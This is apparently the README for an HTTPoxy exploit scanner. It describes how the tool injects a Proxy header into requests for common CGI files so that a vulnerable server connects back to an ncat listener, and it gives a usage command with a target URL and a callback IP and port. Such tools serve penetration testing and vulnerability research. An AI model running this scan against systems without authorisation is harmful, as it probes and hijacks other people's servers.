# HTTPoxy Exploit Scanner 

by 1N3 @CrowdShield (https://crowdshield.com)
Last Updated: 20160720

## ABOUT: 
PoC/Exploit scanner to scan common CGI files on a target URL for the HTTPoxy vulnerability. Httpoxy is a set of vulnerabilities that affect application code running in CGI, or CGI-like environments. For more details, go to https://httpoxy.org.

## REQUIREMENTS: 
Requires ncat to establish reverse session

## USAGE: 
```
./httpoxyscan.py https://target.com cgi_list.txt 10.1.2.243 3000
```
This will scan https://target.com with a list of common CGI files while injecting a Proxy header back to a given IP:PORT. A reverse listener will catch the incoming connection to confirm the remote site is vulnerable.

## DISCLAIMER: 
I take no responsibility for wrong doing or misuse of this exploit.

